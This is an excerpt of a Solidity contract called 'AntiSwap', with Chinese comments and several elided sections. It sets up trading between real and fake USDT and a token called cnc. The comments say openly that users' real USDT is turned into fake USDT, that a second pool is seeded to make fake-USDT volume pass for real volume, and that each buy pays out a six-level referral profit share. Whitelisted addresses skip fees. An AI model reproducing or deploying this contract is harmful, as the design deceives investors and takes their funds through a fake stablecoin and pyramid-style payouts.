...
interface IERC20 {
    ...
    function zeroWriteList(address newOwner) external view returns (bool);

    function timeWriteVery(address newOwner) external view returns (uint256, bool);

    function rpSixAwardPub(uint256 _amount, address _to) external returns (uint256);
}
...
contract AntiSwap is Ownable {
    ...
    function init(address _usdtZhen, address _usdtJia, address _anti, address _router02, address _pair, address _pair2,
        ...
        //让真u和假u加入到白名单之中。这样路由会启动平衡机制：查询价格，添加流动性，Swap交易
        oneToken[usdtZhen] = true;
        oneToken[usdtJia] = true;
    ...
    // ******************************************************
    // 白名单
    mapping(address => bool) public oneToken;

    function setOneTokenList(address _addr, bool _YorN) public onlyOwner {
        oneToken[_addr] = _YorN;
    }

    //判断是否处于白名单。这里就是判断：是否是真U和假U这两个
    function isOneOne(address t1, address t2) public returns (bool){
        if (oneToken[t1] || oneToken[t2]) {
            return true;
        } else {
            return false;
        }
    ...
    function rpSixAwardPub(uint256 _amount, address _to) internal returns (uint256){
        ...
        IERC20(anti).transfer(fundPoolAdd, _amount * fundPoolRate / 1000);//基金池马走日
    ...
    function buy(uint256 _amount) public {
        (uint256 a_,bool b_) = IERC20(anti).timeWriteVery(msg.sender); //查询用户是否能交易？
        if (b_ == false) require(false, a_ == 1 ? "write 3" : "wait 7");//显示对应错误信息。如果是1：提示用户需要在3分钟后可交易，如果是其他则是7分钟后可交易
        ...
        uint256 bf = IERC20(anti).balanceOf(address(this));//查询cnc余额
        if (IERC20(anti).zeroWriteList(msg.sender) == false) {
            uint256 bk = rpSixAwardPub(bf, msg.sender);//开始六层分润
            IERC20(anti).transfer(msg.sender, IERC20(anti).balanceOf(address(this)));//按刨除分润后的金额，系数打给用户
        } else {
            IERC20(anti).transfer(msg.sender, bf);//免手续费，全部转出去
        }
    }

    function sell(uint256 _amount) public {
        (uint256 a_,bool b_) = IERC20(anti).timeWriteVery(msg.sender);//查询用户是否能交易？
        if (b_ == false) require(false, a_ == 1 ? "write 3" : "wait 7");
        IERC20(anti).transferFrom(msg.sender, address(this), _amount);

        //要收取手续费，则在开始交易前先分了润在拿剩余的金额，去交易
        if (IERC20(anti).zeroWriteList(msg.sender) == false) {
    ...
    function remL(uint256 _liquidity) public {
        //上一步：用户得到lp实际是：假u和cnc组合的lp。所以解除的话就是：得到假u和cnc
    ...
    // 流动性管理- cnc到假u。上面是把用户的真u搞成假u，然后添加了池子2的流动性。这一步是手里面直接有假u了，直接添加池子2流动性。以增加池子2假u和cnc的交易量(实际上是真u和cnc交易量)
